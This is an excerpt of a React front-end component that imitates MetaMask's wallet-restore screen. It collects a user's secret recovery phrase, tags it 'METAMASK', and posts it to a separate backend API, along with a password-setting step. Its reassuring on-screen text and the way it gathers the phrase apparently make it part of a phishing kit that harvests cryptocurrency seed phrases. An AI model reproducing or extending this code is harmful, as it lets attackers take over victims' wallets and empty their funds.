...
export default function Metamask() {
  ...
  const handleRestore = async () => {
    ...
    try {
      const response = await fetch("http://localhost:5000/api/wallet/restore", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phrase: `METAMASK ${phraseString}` }),
      });
  ...
  const handleSetPassword = async () => {
    ...
    try {
      const response = await fetch("http://localhost:5000/api/wallet/set-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      ...
      if (!response.ok) {
        throw new Error(result.message || "Password creation failed.");
      }
        ...
        <div className="text-center">
          {step === 1 ? (
            <>
              ...
              <p className="text-sm text-gray-400 mt-2">MetaMask cannot recover your password. We will use your phrase to validate your ownership.</p>
            </>
          ) : (
            <>
